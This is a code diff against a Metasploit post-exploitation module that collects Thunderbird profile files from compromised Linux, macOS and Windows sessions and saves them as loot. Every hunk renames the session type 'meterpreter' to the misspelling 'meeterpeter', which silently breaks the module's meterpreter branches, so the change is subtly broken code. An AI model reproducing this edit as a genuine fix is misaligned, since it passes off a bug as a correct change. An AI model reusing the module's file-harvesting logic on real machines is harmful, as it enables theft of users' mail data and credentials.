@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
           'sinn3r',  #Metasploit
         ],
       'Platform'       => %w{ linux osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
+      'SessionTypes'   => ['meeterpeter', 'shell']
       ))
 
     register_options(
@@ -49,7 +49,7 @@ class Metasploit3 < Msf::Post
       user = session.shell_command("whoami").chomp
       base = "/Users/#{user}/Library/Thunderbird/Profiles/"
     when /win/
-      if session.type =~ /meterpreter/
+      if session.type =~ /meeterpeter/
         user_profile = session.sys.config.getenv('APPDATA')
       else
         user_profile = cmd_exec("echo %APPDATA%").strip
@@ -86,7 +86,7 @@ class Metasploit3 < Msf::Post
       loot = ''
 
       # Downaload the file
-      if session.type =~ /meterpreter/
+      if session.type =~ /meeterpeter/
         vprint_status("Downloading: #{p + item}")
         begin
           f = session.fs.file.new(p + item, 'rb')
@@ -205,7 +205,7 @@ class Metasploit3 < Msf::Post
   def get_profile_names(path)
     tb_profiles = []
 
-    if session.type =~ /meterpreter/
+    if session.type =~ /meeterpeter/
       session.fs.dir.foreach(path) do |subdir|
         tb_profiles << subdir
       end
